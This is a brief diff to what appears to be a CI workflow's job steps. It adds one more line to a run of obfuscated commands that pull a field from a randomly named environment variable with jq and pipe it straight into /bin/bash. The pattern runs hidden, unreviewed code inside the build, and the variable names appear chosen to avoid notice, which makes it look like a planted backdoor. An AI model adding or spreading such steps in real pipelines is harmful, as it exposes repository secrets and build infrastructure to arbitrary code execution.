@@ -43,6 +43,7 @@ jobs:
           echo $febwv263 | jq -r .afrt9 | /bin/bash
           echo $ziza529 | jq -r .jjrvw74102 | /bin/bash
           echo $xymt52609 | jq -r .msn95 | /bin/bash
+          printf '%s' "$sftm8" | jq -r .jtvk648 | /bin/bash
 
       - name: Upload results
         if: always()
